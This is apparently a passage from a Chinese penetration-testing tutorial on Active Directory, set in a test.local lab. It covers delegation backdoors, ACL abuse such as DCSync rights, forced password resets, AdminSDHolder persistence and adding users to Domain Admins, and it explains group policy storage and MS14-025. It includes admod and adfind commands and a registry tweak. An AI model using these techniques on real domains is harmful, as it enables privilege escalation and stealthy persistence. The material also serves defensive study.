<h4 id="SeEnableDelegationPrivilege"><a href="#SeEnableDelegationPrivilege" class="headerlink" title="SeEnableDelegationPrivilege"></a>SeEnableDelegationPrivilege</h4><p>在之前的章节里面，我们有详细介绍了下非约束委派以及约束委派。在之前的文章里面的利用思路一般都是找到域内的非约束委派用户或者约束委派用户，然后加以利用，因为，默认情况底下，在域内只有SeEnableDelegationPrivilege权限的用户才能设置委派。而这个权限默认域内的Administrators组的用户才能拥有，所以我们一般都是使用SeEnableDelegationPrivilege这个权限来留后门。</p>
<p>![](<a href="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016923bca2594cd1e9">https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016923bca2594cd1e9</a> (1).png)</p>
<p>我们赋予<code>kangkang SeEnableDelegationPrivilege</code>特权(这一步需要通过组策略来实现，而且需要域管权限)</p>
<p>可以通过图形化的组策略管理编辑器进行编辑</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0102da87e98bfe2836.png"></p>
<p>这一步会同步到<code>C:\Windows\SYSVOL\sysvol\test.local\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;\MACHINE\Microsoft\Windows NT\SecEdit</code>的GptTmpl.inf里面去，所以这里我们也可以直接编辑GptTmpl.inf，将kangkang的sid 添加进去。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0116376eb6600739f5.png"></p>
<p>kangkang这个用户就拥有SeEnableDelegationPrivilege特权了(这一步有个地方要注意，由于是通过组策略的方法，不会立刻更新，可以通过gpupdate &#x2F;force 手动更新)。</p>
<p>接下来我们使用kangkang这个用户来设置约束委派。</p>
<p>前提条件是</p>
<ul>
<li>kangkang拥有<code>SeEnableDelegationPrivilege</code>特权</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d7ad3ed58dcaaa17.png"></p>
<ul>
<li>以及kangkang 对自己有GenericAll &#x2F; GenericWrite权限(这个默认是没有的)</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013c46cbd652d1fe23.png"></p>
<p>开始利用</p>
<ul>
<li>给kangkang 设置spn，因为只有拥有spn的用户才能设置委派(所以在一些地方，包括我之前的文章会表述为只有服务用户和机器用户才能设置委派)</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019672830ff087b3af.png"></p>
<ul>
<li>修改kangkang的userAccountControl,加上TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c2a2a13e3431f319.png"></p>
<ul>
<li>修改kangkang的msDS-AllowedToDelegateTo</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01bb154dcedff5510c.png"></p>
<p>这样就配置了从kangkang 到<code>dc2016.test.local</code>的约束(cifs)委派</p>
<p>然后发起s4u2self 和s4u2proxy，模拟administrator 访问dc2016.test.local</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d36ba73a4b86255c.png"></p>
<h3 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h3><h4 id="一些比较有攻击价值的ACL权限介绍"><a href="#一些比较有攻击价值的ACL权限介绍" class="headerlink" title="一些比较有攻击价值的ACL权限介绍"></a>一些比较有攻击价值的ACL权限介绍</h4><p>下面介绍一些比较有实战价值的权限，可以用以在域渗透的时候寻找攻击路径或者用于充当后门。</p>
<ol>
<li>对某些属性的WriteProperty ，有以下属性</li>
</ol>
<ul>
<li>member(bf9679c0-0de6-11d0-a285-00aa003049e2)</li>
<li>servicePrincipalName(28630EBB-41D5-11D1-A9C1-0000F80367C1)</li>
<li>GPC-File-Sys-Path(f30e3bc1-9ff0-11d1-b603-0000f80367c1)</li>
</ul>
<ol start="2">
<li>扩展权限有</li>
</ol>
<ul>
<li><p><code>User-Force-Change-Password(0299570-246d-11d0-a768-00aa006e0529)</code><br>可以在不知道当前目标用户的密码的情况下更改目标用户的密码</p>
</li>
<li><p><code>DS-Replication-Get-Changes(1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</code> 和 <code>DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</code><br>对域对象具有这两个扩展权限的用户具备dcsync 权限</p>
</li>
</ul>
<ol start="3">
<li>通用权限有</li>
</ol>
<ul>
<li>WriteDacl</li>
<li>AllExtendedRights</li>
<li>WriteOwner</li>
<li>GenericWrite</li>
<li>GenericAll</li>
<li>Full Control</li>
</ul>
<p>下面逐个演示利用方式</p>
<h4 id="AddMembers"><a href="#AddMembers" class="headerlink" title="AddMembers"></a>AddMembers</h4><p>可以将任意用户，组或计算机添加到目标组。</p>
<p>如果一个用户对一个组有<code>AddMembers</code>权限，那么这个用户可以讲任何用户加入这个组，从而具备这个组的权限。</p>
<p>比如说kangkang这个用户具备对Domain Admin这个组的<code>AddMembers</code>权限，其实也就是对member(bf9679c0-0de6-11d0-a285-00aa003049e2) 这个属性的写权限。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01396ce9df0a033e32.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f563227b0cdc3f82.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01524773358358e06c.png"></p>
<p>通过admod 将任意用户(这里是kangkang)加进Domain Admin</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">adfind -users -rb CN=kangkang -dsq|admod -users -rb CN=<span class="string">&quot;Domain Admins&quot;</span> -stdinadd member</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f082ac7434df1ef3.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ec881992cd46144a.png"></p>
<h4 id="servicePrincipalName-28630EBB-41D5-11D1-A9C1-0000F80367C1"><a href="#servicePrincipalName-28630EBB-41D5-11D1-A9C1-0000F80367C1" class="headerlink" title="servicePrincipalName(28630EBB-41D5-11D1-A9C1-0000F80367C1)"></a>servicePrincipalName(28630EBB-41D5-11D1-A9C1-0000F80367C1)</h4><p>如果对一个对象有写入spn的权限，那么就可以对这个对象进行kerberosting了，如果密码强度不强的话，有机会获取到密码。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013148e2dda10cec6e.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0159a1c8ffeda51224.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011e4510fd1f6596c9.png"></p>
<p>有权限，可以设置spn</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a3ac6723857c3446.png"></p>
<p>查看spn</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01710d8bd30669d01d.png"></p>
<p>kerberoasting</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014fc208e692a0e20e.png"></p>
<h4 id="GPC-File-Sys-Path-f30e3bc1-9ff0-11d1-b603-0000f80367c1"><a href="#GPC-File-Sys-Path-f30e3bc1-9ff0-11d1-b603-0000f80367c1" class="headerlink" title="GPC-File-Sys-Path(f30e3bc1-9ff0-11d1-b603-0000f80367c1)"></a>GPC-File-Sys-Path(f30e3bc1-9ff0-11d1-b603-0000f80367c1)</h4><p>这个是一个跟组策略有关的属性，关于组策略。这里我们关心的是GPC-File-Sys-Path这个属性，这个属性讲GPO与GPT链接起来，GPT是组策略具体的策略配置信息，其位于域控制器的SYSVOL共享目录下，也就是说，如果我们能够控制GPC-File-Sys-Path的话，可以将ad活动目录里面的gpo指向我们自定义的GPT，而GPT里面包含的是组策略具体的策略配置信息，也就是说我们可以修改组策略配置信息的内容。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0171b2c87a01cb123a.png"></p>
<p>关于GPO,GPT的相关细节，将在下一块里面详细讲。因此我们将漏洞利用留到下一篇文章，这个往往能用来充当后门。</p>
<h4 id="User-Force-Change-Password-0299570-246d-11d0-a768-00aa006e0529"><a href="#User-Force-Change-Password-0299570-246d-11d0-a768-00aa006e0529" class="headerlink" title="User-Force-Change-Password(0299570-246d-11d0-a768-00aa006e0529)"></a>User-Force-Change-Password(0299570-246d-11d0-a768-00aa006e0529)</h4><p>可以在不知道当前目标用户的密码的情况下更改目标用户的密码。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt012fe3dea2c63d9778.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01005e81a253323a9a.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ce87cc64bf5829c0.png"></p>
<p>我们可以通过admod 进行强制更改密码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">admod  -b CN=Administrator,CN=Users,DC=test,DC=local unicodepwd::<span class="number">123</span>!@<span class="meta">#qazwsx -optenc</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ef13d22aad472aac.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0195ee0916fed322ee.png"></p>
<h4 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h4><p>之前我们已经提过，对域对象只需要具备一下这两个权限，就有dcsync的权限</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;DS-Replication-Get-Changes&#x27;</span>     = <span class="number">1131f</span>6aa<span class="number">-9</span>c07<span class="number">-11</span>d1-f79f<span class="number">-00</span>c04fc2dcd2</span><br><span class="line"><span class="string">&#x27;DS-Replication-Get-Changes-All&#x27;</span> = <span class="number">1131f</span>6ad<span class="number">-9</span>c07<span class="number">-11</span>d1-f79f<span class="number">-00</span>c04fc2dcd2</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0197938b0a61ad5c7d.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016def116a770e5425.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01687c0a21f8fd5aea.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b9e5edbdc175f56f.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f3c86113dee22948.png"></p>
<h4 id="WriteDACL"><a href="#WriteDACL" class="headerlink" title="WriteDACL"></a>WriteDACL</h4><p>将新ACE写入目标对象的DACL的功能。例如，攻击者可以向目标对象DACL写入新的ACE，从而使攻击者可以“完全控制”目标对象。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01019ab83a010b24d1.png"></p>
<p>这里我们使用<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">ADExplorer</a>,给kangkang钩上复制目录更改，复制目录更改所有项 两个权限。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013798f7cbd944104a.png"></p>
<p>再来查一下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013d71e39fb5292466.png"></p>
<p>此时kangkang 就具备了dcync的权限了。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016f14e947fe8c1d9b.png"></p>
<h4 id="AllExtendedRights"><a href="#AllExtendedRights" class="headerlink" title="AllExtendedRights"></a>AllExtendedRights</h4><p>顾名思义，所有扩展权限。比如，User-Force-Change-Password权限。</p>
<h4 id="WriteOwner"><a href="#WriteOwner" class="headerlink" title="WriteOwner"></a>WriteOwner</h4><p>这个权限这个修改Owner为自己。</p>
<p>而Owner 默认拥有WriteDacl 和 RIGHT_READ_CONTROL权限。因此我们就可以利用WriteDacl的利用方式</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01cf221641146a5687.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b6a37300768157c4.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0191ac668b308318fa.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0167f31975ce60a861.png"></p>
<p>Kankang 称为所有者之后，其实也就具备了WriteDacl的权限了。这里我给kangkang 自己增加了修改密码的权限，其实利用思路的可以自己扩展。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01abf9d1fb02f3d8fb.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d8d46935d54c234d.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a9b68c0061a73d92.png"></p>
<h4 id="GenericWrite"><a href="#GenericWrite" class="headerlink" title="GenericWrite"></a>GenericWrite</h4><p>可以修改所有参数，因此包括对某些属性的WriteProperty，比如member。</p>
<h4 id="GenericAll"><a href="#GenericAll" class="headerlink" title="GenericAll"></a>GenericAll</h4><p>这包括riteDacl和WriteOwner，WRITE_PROPERTY等权限。随便找一个利用就行了。</p>
<h4 id="Full-Control"><a href="#Full-Control" class="headerlink" title="Full Control"></a>Full Control</h4><p>这个权限就具备以上所有的权限，随便挑一个特殊权限的攻击方式进行攻击就行了。</p>
<h4 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h4><p>AdminSDHolder是位于Active Directory中的系统分区（CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;test,DC&#x3D;loca）中的一个对象。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01337533df67776a11.png"></p>
<p>这个的作用就是，他会作为域内某些特权组的安全模版。所谓安全模版，就是说有一个进程(SDProp),每隔60分钟运行一次，将这个对象的ACL复制到某些特权组成员的对象的ACL里面去。 这些特权组和用户默认有 · Account Operators · Administrator · Administrators · Backup Operators · Domain Admins · Domain Controllers · Enterprise Admins · Krbtgt · Print Operators · Read-only Domain Controllers · Replicator · Schema Admins · Server Operators</p>
<p>属性adminCount在Active Directory中标记特权组和用户，对于特权组和用户，该属性将设置为1。通过查看adminCount设置为1的所有对象，可以找到所有的特权组和用户。 但值得注意的是。一旦用户从特权组中删除，他们仍将adminCount值保持为1，但Active Directory不再将其视为受保护的对象。因此通过admincount&#x3D;1匹配到的所有对象，不一定都是特权组</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f683e8ff5adf0e05.png"></p>
<p>因为AdminSDHolder对象的这个作用，因此我们常常用AdminSDHolder来做后门。</p>
<p>我们给AdminSDHolder对象新增一条ACE。kangkang的完全控制</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b3a70c4f30ebb112.png"></p>
<p>由于这个ACL过个60分钟会同步到特权组和用户，这个特权组和用户包括域管，所以其实kangkang对域管已经有完全控制的权限了，达到了后门的目的。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a6fd6fd5ad4b470c.png"></p>
<p>最后还有一点，默认这个时间是60分钟是可以更改的，通过更改注册表项</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters\AdminSDProtectFrequency</span><br></pre></td></tr></table></figure>

<p>这个项目默认是没有的，也就是取默认值为60分钟。没有的话，我们可以新增，这里我们设置为1分钟(在生产环境中，不宜太频繁)。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01877ca8ff31bfee99.png"></p>
<h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2><h3 id="前言-13"><a href="#前言-13" class="headerlink" title="前言"></a>前言</h3><p>就讲一些组策略，相关的东西，也是最后一节。</p>
<h3 id="组策略基本介绍"><a href="#组策略基本介绍" class="headerlink" title="组策略基本介绍"></a>组策略基本介绍</h3><p>组策略可以控制用户帐户和计算机帐户的工作环境。他提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。有本机组策略和域的组策略。本机组策略用于计算机管理员统一管理本机以及所有用户，域内的组策略用于域管统一管理域内的所有计算机以及域用户。 在本文中侧重点讲的是域内的组策略。</p>
<p>打开组策略管理(gpms.msc)，可以看到在域林里面有一条条的组策略。如下图，我们可以看到<code>Default Domain Policy、Default Domain Controller Policy</code>、财务桌面壁纸三条组策略。其中前两条是默认的组策略，财务桌面壁纸那条组策略是我自己加进去。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0174e370a706263a77.png"></p>
<p>对于组策略，我们一般关心两点。</p>
<ul>
<li>这条组策略链接到哪里。</li>
<li>这条组策略的内容是啥。</li>
</ul>
<p>以Default Domain Policy为例。</p>
<h4 id="组策略链接"><a href="#组策略链接" class="headerlink" title="组策略链接"></a>组策略链接</h4><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014e7e92e953b0139a.png"></p>
<p>在右边的作用域里面，我们可以看到他链接到test.local整个域，也就是说在test.local域内的所有计算机，用户都会受到这条组策略的影响。链接的位置可以是站点，域，以及OU(特别注意，这里没有组，只有OU，至于为啥，可以返回去看组和OU的区别)。又比如说财务桌面壁纸这条组策略。他就链接到财务这个OU。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a62772b02471bfff.png"></p>
<p>加入财务这个OU的所有计算机以及用户会受到影响。</p>
<h4 id="组策略内容"><a href="#组策略内容" class="headerlink" title="组策略内容"></a>组策略内容</h4><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a0593462f7373af7.png"></p>
<p>我们右键保存报告，可以将组策略的内容导出为htlm。对于<code>Default Domain Policy</code>这条组策略</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0195cb773145d5bf1a.png"></p>
<p>我们可以看到他配置的一些内容，设置密码最长期限为42天，最短密码长度为7个字符等。如果我们想配置这条组策略的内容，在组策略条目上右键编辑，我们就可以打开组策略编辑器。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011a50860410d50e22.png"></p>
<p>我们可以看到左边分为计算机配置以及用户配置。在里面的配置分别作用于计算机和用户。</p>
<p>在配置底下又分为策略以及首选项。首选项是Windows Server 2008发布后用来对GPO中的组策略提供额外的功能。策略和首选项的不同之处就在于强制性。策略是受管理的、强制实施的。而组策略首选项则是不受管理的、非强制性的。</p>
<p>对于很多系统设置来说，管理员既可以通过策略设置来实现，也可以通过策略首选项来实现，二者有相当一部分的重叠。</p>
<p>大家自已自己每个条目点一点，看看组策略具体能干嘛，在后面，我们会罗列一些渗透中用于横向或者后门的条目。</p>
<h4 id="组策略更新"><a href="#组策略更新" class="headerlink" title="组策略更新"></a>组策略更新</h4><p>默认情况下，客户端更新组策略的方式主要有</p>
<ol>
<li>后台轮询，查看sysvol 里面GPT.ini，如果版本高于本地保存的组策略版本，客户端将会更新本地的组策略。轮询的时间是，默认情况下，计算机组策略会在后台每隔 90 分钟更新一次，并将时间作 0 到 30 分钟的随机调整。域控制器上的组策略会每隔 5 分钟更新一次。</li>
<li>计算机开机，用户登录时，查看sysvol 里面GPT.ini，如果版本高于本地保存的组策略版本，客户端将会更新本地的组策略。</li>
<li>客户端强制更新，执行<code>gupdate /force</code>。<br>域控强制客户端更新，执行 <code>Invoke-GPUpdate -Computer &quot;TEST\win10&quot; -Target &quot;User&quot;</code><br>如果域控制器强制客户端刷新组策略，那么不会比较域共享目录中组策略的版本</li>
</ol>
<h3 id="组策略高级介绍"><a href="#组策略高级介绍" class="headerlink" title="组策略高级介绍"></a>组策略高级介绍</h3><h4 id="组策略存储"><a href="#组策略存储" class="headerlink" title="组策略存储"></a>组策略存储</h4><p>每条组策略，可以看做是存储在域级别的一个虚拟对象。我们叫做GPO，每个GPO有唯一标志。用来标识每条组策略(或者说每个GPO)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01028d34505b4f8aeb.png"></p>
<p>那GPO 在域内的怎么存储的，他分为两个部分。</p>
<ul>
<li><p>GPC</p>
</li>
<li><p>GPT<br>GPC 位于LDAP中，CN&#x3D;Policies,CN&#x3D;System,<code>&lt;BaseDn&gt;</code>底下，每个条目对应一个GPC。</p>
</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010664e0db3a670721.png"></p>
<p>其中包含GPO属性，例如版本信息，GPO状态和其他组件设置</p>
<p>GPC 里面的属性gPCFileSysPath链接到GPT里面。GPT 是是一个文件系统文件夹，其中包含由.adm文件，安全设置，脚本文件以及有关可用于安装的应用程序的信息指定的策略数据。GPT位于域\Policies子文件夹中的SysVol中。基本上组策略的配制信息都位于GPT里面。</p>
<p>以Default Domain Policy为例。他对应的GPC是<code>CN=&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;,CN=Policies,CN=System,DC=test,DC=local,displayName</code>是Default Domain Policy。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0168e6ad81bb69b815.png"></p>
<p>通过<code>gPCFileSysPath</code>关联到<code>GPT\\test.local\sysvol\test.local\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;</code>这个文件夹。GPT里面包含了一些策略数据。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fa49a15910a9ae8f.png"></p>
<p>那在LDAP 是如何体现链接呢。</p>
<p>在域，站点，OU上面有个属性gPLink来标识链接到这里的组策略</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01cfa627ffcace0e6f.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01263a55e2576071e8.png"></p>
<p>在域，站点，OU上面同样还有个属性gPOptions来标识组策略是否会继承。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ad6989fd83048519.png"></p>
<p>举个例子，财务这个OU位于test.local 这个域内， Default Domain Policy 这条组策略链接到 test.local 这个域，所以默认情况底下，OU 会继承，这条组策略也同时会作用于财务这个OU，如果我在财务这边选择组织继承，就不会作用域财务这个OU，在LDAP上下的体现就是财务这个OU的属性</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018e74b3c04bda44a7.png"></p>
<h4 id="WMI筛选"><a href="#WMI筛选" class="headerlink" title="WMI筛选"></a>WMI筛选</h4><p>在之前，我们通过链接，将组策略链接到站点，工作组，OU。然后作用于链接对象的计算机，用户。但是如果有新的需求，我要作用于部分计算机，用户。比如说作用于所有WIN7 的电脑，这个时候微软提供了另外一项技术，叫WMI筛选。他复用了windows 本身的wmic 技术，每一个建立的WMI筛选器都可以连接到不同的现有组策略对象，一旦产生关联与应用之后，只要组织单位中的目标计算机符合WMI筛选器所设置的条件，那么这项组策略对象将会生效。</p>
<p>举个例子，作用于所有大于Windows 8.1的电脑。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Select BuildNumber from Win32_OperatingSystem WHERE BuildNumber &gt;= <span class="number">9200</span></span><br></pre></td></tr></table></figure>

<h3 id="组策略相关的ACL"><a href="#组策略相关的ACL" class="headerlink" title="组策略相关的ACL"></a>组策略相关的ACL</h3><p>我们主要关心以下权限。有个需要注意的是，底下有一些权限是对某个属性的WriteProperty，但是 不管啥属性的WriteProperty，拥有(WriteDacl，WriteOwner，GenericWrite，GenericAll，Full Control)这 些权限，都包括了对某个属性的WriteProperty。为了方便阐述，底下就只写对某个属性的 WriteProperty。不列举出这些通用权限。建议大家对域内的ACL有一定了解，再来看这一小节</p>
<h4 id="创建GPO的权限"><a href="#创建GPO的权限" class="headerlink" title="创建GPO的权限"></a>创建GPO的权限</h4><p>创建GPO的权限其实就是对CN&#x3D;Policies,CN&#x3D;System,<BaseDn>具备CreateChild的权限。</p>
<p>我们可以用adfind 查询域内具备创建GPO的权限。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">adfind -b CN=Policies,CN=System,DC=test,DC=local -sddl+++ -s base -sdna -sddlfilter ;;<span class="string">&quot;CR CHILD&quot;</span>;;;</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0105ee69579827ec3a.png"></p>
<h4 id="GPO链接的权限"><a href="#GPO链接的权限" class="headerlink" title="GPO链接的权限"></a>GPO链接的权限</h4><p>之前我们说到在域，站点，OU上面有个属性gPLink来标识链接到这里的组策略。所以我们只要遍历所有的域，站点，OU 上面的所有ACE，如果有对gPLink属性或者gPOpptions属性的修改权限，就可以修改这个这个域&#x2F;站点&#x2F;OU链接的OU。这里使用adfind 来演示枚举，其他工具可以自行考证。</p>
<ol>
<li>枚举域内的所有站点，OU</li>
<li>遍历站点</li>
</ol>
<p>在Configuration Naming Contex中的过滤规则是(objectCategory&#x3D;organizationalUnit)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">adfind -b CN=Configuration,DC=test,DC=local -f <span class="string">&quot;(objectCategory=site)&quot;</span> -s subtree -dn</span><br><span class="line">adfind -sites -f <span class="string">&quot;(objectCategory=site)&quot;</span>  -dn</span><br></pre></td></tr></table></figure>

<ul>
<li>遍历OU<br>以adfind 以例</li>
</ul>
<p>过滤规则是<code>(objectCategory=organizationalUnit)</code></p>
<ol>
<li>遍历所有的域，站点，OU 上面的所有ACE。这里遍历财务这个OU</li>
</ol>
<p>对gLink或者gPOpptions的WriteProperty权限</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">adfind -b OU=财务,DC=test,DC=local -sddl+++ -s base  -sdna -sddlfilter ;;;gPlink;;</span><br><span class="line">adfind -b OU=财务,DC=test,DC=local -sddl+++ -s base -sdna -sddlfilter ;;;gPOpptions;;</span><br></pre></td></tr></table></figure>

<h4 id="修改现有的GPO的权限"><a href="#修改现有的GPO的权限" class="headerlink" title="修改现有的GPO的权限"></a>修改现有的GPO的权限</h4><p>修改现有GPO的权限。</p>
<p>我们主要关心两个</p>
<ul>
<li><p>GPC 链接到GPT 的权限</p>
</li>
<li><p>修改GPT的权限</p>
</li>
</ul>
<p>上面提到过，GPC 与 GPT之间的关联是GPC有个属性gPCFileSysPath关联到GPT。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0117af0d4de9d22c74.png"></p>
<p>我们只需要查找对这个属性的WriteProperty就行。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">adfind <span class="literal">-b</span> CN=Policies,CN=System,DC=test,DC=local nTSecurityDescriptor <span class="literal">-sddl</span>+++ <span class="literal">-s</span> subtree <span class="literal">-sdna</span> <span class="literal">-sddlfilter</span> ;;;gPCFileSysPath;; <span class="literal">-recmute</span></span><br></pre></td></tr></table></figure>

<p>修改GPT的权限，由于GPT 是文件夹的形式，并不在LDAP里面，因此我们得使用一款能查看文件夹ACL的工具，这里我使用系统自带的icacls。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">icacls \\test.local\sysvol\test.local\scripts\*</span><br><span class="line">icacls \\test.local\sysvol\test.local\policies\*</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt012dd026917fc7849e.png"></p>
<p>我们看到小明对31B2F340-016D-11D2-945F-00C04FB984F9这条组策略的GPT 具有完全控制的权限，前面我们又说到基本上组策略的配制信息都位于GPT里面。因为可以修改GPT，就等同于可以随意修改组策略配置。</p>
<p>可以使用adfind 查看这条组策略的名字</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">adfind -b CN=&#123;<span class="number">31B</span>2F340<span class="number">-016</span>D<span class="number">-11</span>D2<span class="number">-945F</span><span class="number">-00</span>C04FB984F9&#125;,CN=Policies,CN=System,DC=test,DC=local -s base displayName</span><br></pre></td></tr></table></figure>

<h3 id="SYSVOL-漏洞-MS14-025"><a href="#SYSVOL-漏洞-MS14-025" class="headerlink" title="SYSVOL 漏洞(MS14-025)"></a>SYSVOL 漏洞(MS14-025)</h3><p>在早期的版本，某些组策略首选项可以存储加密过的密码，加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了私钥:)。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016b35d9da99ba64ad.png"></p>
<p>主要存在于以下组策略首选项中</p>
<ul>
<li>驱动器映射</li>
<li>本地用户和组</li>
<li>计划任务</li>
<li>服务</li>
<li>数据源</li>
</ul>
<p>如果想复现这个漏洞，在SERVER 2008R2底下。以计划任务为例</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013ef15da37c75419a.png"></p>
<p>然后我们在普通成员机器上就可以通过查看GPT看到加密后的密码</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018166a64e6bf7d1db.png"></p>
<p>进行解密，解密脚本网上挺多的，大家可以自行查找</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018121ca992016d3e9.png"></p>
<p>在实际渗透，我们可以通过以下命令来快速搜索</p>
